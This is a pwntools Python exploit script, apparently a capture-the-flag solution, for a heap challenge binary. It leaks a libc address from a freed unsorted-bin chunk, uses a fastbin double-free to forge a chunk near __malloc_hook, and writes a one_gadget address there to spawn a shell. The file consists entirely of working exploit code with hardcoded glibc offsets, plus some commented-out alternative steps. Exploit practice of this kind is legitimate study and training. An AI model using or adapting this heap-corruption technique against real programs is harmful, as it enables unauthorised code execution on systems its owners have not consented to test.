#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./old_patched")

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses
libc_offset = 0x3c4b78 # Calculated by leaking unsortedbins with no aslr and calculating distance to libc base
one_offset = 0x4527a
malloc_hook_offset = 0x3c4b10 # found using objdump -T <libc> | grep __malloc_hook
rdi_off = 0x21112
rdx_rsi_off = 0x1151c9
binsh_off = 0x18ce57

# Functions
m_index = 0

def malloc(size: int):
    global m_index
    io.sendline(b"1")
    io.sendlineafter(b"idx: ", f"{m_index}".encode())
    m_index += 1
    io.sendlineafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")

def free(index: int):
    io.sendline(b"2")
    io.sendlineafter(b"idx: ", str(index).encode())
    io.recvuntil(b"> ")

def write(content: bytes, index: int):
    io.sendline(b"3")
    io.sendlineafter(b"idx: ", str(index).encode())
    io.sendlineafter(b"contents: ", content)
    io.recvuntil(b"> ")

def view(index: int):
    io.sendline(b"4")
    io.sendlineafter(b"idx: ", str(index).encode())
    io.recvuntil(b"data: ")
    leak = io.recvuntil(b"[")
    io.recvuntil(b"> ")
    return leak

io = start()

# 1. leak libc
malloc(0x80) # idx 0
malloc(0x20) # idx 1
free(0)
libc_leak = view(0).rstrip(b"[")
libc_leak = u64(libc_leak.ljust(8, b"\x00"))
log.info("libc leak: %s" % hex(libc_leak))
libc_base = libc_leak - libc_offset
log.info("libc base: %s" % hex(libc_base))

rdi_ret = rdi_off + libc_base
rdx_rsi_ret = rdx_rsi_off + libc_base

one_gadget = libc_base + one_offset
malloc_hook = libc_base + malloc_hook_offset

# 2. fastbin dup
malloc(0x48) # Old chunk, idx 2
malloc(0x48) # A idx 3
malloc(0x48) # B idx 4

free(3) # A idx 3 : A linked into fastbin
free(4) # B idx 4 : B linked into fastbin
free(3) # A idx 3 : A linked into fastbin again

malloc(0x48) # Reallocate A, idx 5
write(p64(0x61), 5) # Write a fake size field into the main arena
malloc(0x48) # Reallocate B, idx 6
malloc(0x48) # Reallocate A, idx 7 : Now we have malloc_hook-35 at head of fastbins

malloc(0x58) # 8
malloc(0x58) # 9

free(8)
free(9)
free(8)

malloc(0x58) # 10
write(p64(malloc_hook+40),10)
malloc(0x58) # 11
malloc(0x58) # 12

malloc(0x58) # 13 request the chunk with fake size field
write(p64(0)*6 + p64(malloc_hook-35), 13) # overwrite top chunk with malloc_hook-35

malloc(0x28) # 14, Will be serviced by smallbins 0x40
malloc(0x28) # 15, will be serviced by top chunk which is at malloc_hook-35
write(b"A"*19 + p64(one_gadget), 15)

# use cutter to patch alarm clock and take it from there
# if one gadget not working, overwrite malloc hook with system and call malloc with /bin/sh

#io.sendline(b"2")
#io.sendline(b"25")
#io.sendline(b"0x20")


#malloc(0x88) # 8
#malloc(0x88) # 9

#free(8)
#free(9)
#free(8)

#malloc(0x88) # Reallocate 10 (8 reallocate)
#write(p64(malloc_hook+72), 10) # redirect 10 to malloc_hook+72
#malloc(0x88) # 11 (reallocate 9)
#malloc(0x88) # 12 (reallocate 8) this one is right before top chunk pointer
#write(p64(0x61), 12) # Write 0x61 to 8 to make a fake size field


# 3. Overwrite malloc hook
#malloc(0x68) # Must be size 0x70 chunk, idx 8
#write(b"A"*19, 8)












io.interactive()
